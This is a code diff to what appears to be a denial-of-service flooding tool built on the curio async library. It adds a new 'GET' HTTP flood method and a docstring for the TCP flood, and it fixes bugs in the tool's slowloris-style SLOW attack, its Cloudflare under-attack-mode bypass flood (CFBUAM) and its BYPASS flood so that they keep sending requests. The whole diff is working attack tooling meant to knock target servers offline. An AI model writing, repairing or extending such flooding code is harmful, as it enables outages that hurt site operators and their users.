@@ -390,7 +390,7 @@ async def flood_packets_gen_v2(ctx, fid, target, packets):
     async with TcpConnection(ctx, target) as conn:
         if conn.sock:
             stream = conn.sock.as_stream()
-            for payload in packets:
+            async for payload in packets:
                 conn.mark_packet_sent()
                 ctx.track_packet_sent(fid, target, len(payload))
 
@@ -461,9 +461,26 @@ async def UDP(ctx: Context, fid: int, target: Target):
 
 
 async def TCP(ctx: Context, fid: int, target: Target):
+    """Sends RPC randomly generated TCP packets into open TCP connection.
+
+    Layer: L4.
+    """
     async def gen():
         for _ in range(ctx.rpc):
             yield randbytes(ctx.packet_size)
+
+    await flood_packets_gen(ctx, fid, target, gen())
+
+
+async def GET(ctx: Context, fid: int, target: Target):
+    """Sends RPC randomly generated HTTP GET requests into open TCP connection.
+
+    Layer: L7.
+    """
+    async def gen():
+        req: bytes = http_req_payload(target, "GET")
+        for _ in range(ctx.rpc):
+            yield req
 
     await flood_packets_gen(ctx, fid, target, gen())
 
@@ -495,7 +512,7 @@ async def BYPASS(ctx: Context, fid: int, target: Target):
             for _ in range(ctx.rpc):
                 req, chunks = http_req_get(target), []
                 bytes_sent = await conn.sock.sendall(req)
-                if bytes_sent == len(req):
+                if bytes_sent is None or bytes_sent == len(req):
                     while True:
                         chunk = await conn.sock.recv(1024)
                         if not chunk:
@@ -503,7 +520,7 @@ async def BYPASS(ctx: Context, fid: int, target: Target):
                         chunks.append(chunk)
                 else:
                     ctx.logger.error(f"connection closed: {bytes_sent}/{len(req)}")
-                ctx.track_packet_sent(fid, target, bytes_sent + sum(map(len, chunks)))
+                ctx.track_packet_sent(fid, target, (bytes_sent or 0) + sum(map(len, chunks)))
 
 
 async def CONNECTION(ctx: Context, fid: int, target: Target):
@@ -540,18 +557,18 @@ async def SLOW(ctx: Context, fid: int, target: Target):
         if conn.sock:
             for _ in range(ctx.rpc):
                 bytes_sent = await conn.sock.sendall(req)
-                ctx.track_packet_sent(fid, target, bytes_sent)
+                ctx.track_packet_sent(fid, target, bytes_sent or 0)
             while True:
                 bytes_sent = await conn.sock.sendall(req)
-                if bytes_sent < len(req):
+                if bytes_sent is not None and bytes_sent < len(req):
                     break
                 await conn.sock.recv(1)
                 header = f"X-a: {randint(1,5000)}\r\n".encode()
-                header_bytes_sent = conn.sock.sendall(header)
+                header_bytes_sent = await conn.sock.sendall(header)
                 # xxx(okachaiev): this will overflow as we are sending too many
                 # requests here (infinitely more than RPC). need to find a wayt
                 # to track this properly
-                ctx.track_packet_sent(fid, target, bytes_sent+header_bytes_sent)
+                ctx.track_packet_sent(fid, target, (bytes_sent or 0)+(header_bytes_sent or 0))
                 await curio.sleep(ctx.rpc/15) # xxx(okachaiev): too long?
 
 
@@ -566,13 +583,13 @@ async def CFBUAM(ctx: Context, fid: int, target: Target):
     async with TcpConnection(ctx, target) as conn:
         if conn.sock:
             bytes_sent = await conn.sock.sendall(req)
-            if bytes_sent < len(req): return
+            if bytes_sent is not None and bytes_sent < len(req): return
             await curio.sleep(5.01)
             with curio.ignore_after(120):
                 for _ in range(ctx.rpc):
                     bytes_sent = await conn.sock.sendall(req)
-                    if bytes_sent < len(req): return
-                    ctx.track_packet_sent(fid, target, bytes_sent)
+                    if bytes_sent is not None and bytes_sent < len(req): return
+                    ctx.track_packet_sent(fid, target, bytes_sent or 0)
 
 
 # xxx(okachaiev): flexible delay configuration
@@ -705,6 +722,7 @@ default_strategies = {
     "slow": SLOW,
     "cfbuam": CFBUAM,
     "avb": AVB,
+    "get": GET,
 }
 
 
